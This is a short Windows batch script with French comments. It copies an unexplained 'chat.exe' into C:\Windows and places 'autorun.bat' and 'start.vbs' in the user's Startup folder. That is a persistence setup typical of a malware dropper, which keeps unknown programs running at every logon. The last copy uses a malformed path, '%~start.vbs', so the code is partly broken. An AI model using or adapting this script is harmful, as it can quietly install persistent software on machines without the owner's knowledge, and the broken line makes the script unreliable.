@echo off
REM --- Définir la source (chat.exe doit être à côté du .bat)
set "SOURCE=%~dp0chat.exe"

REM --- Définir la destination dans C:\Windows
set "DEST=C:\Windows\chat.exe"

REM --- Copier le fichier
copy "%SOURCE%" "%DEST%" /Y
set "SOURCE=%~dp0autorun.bat"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\autorun.bat"
copy "%SOURCE%" "%DEST%" /Y
set "SOURCE=%~start.vbs"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.vbs"
copy "%SOURCE%" "%DEST%" /Y

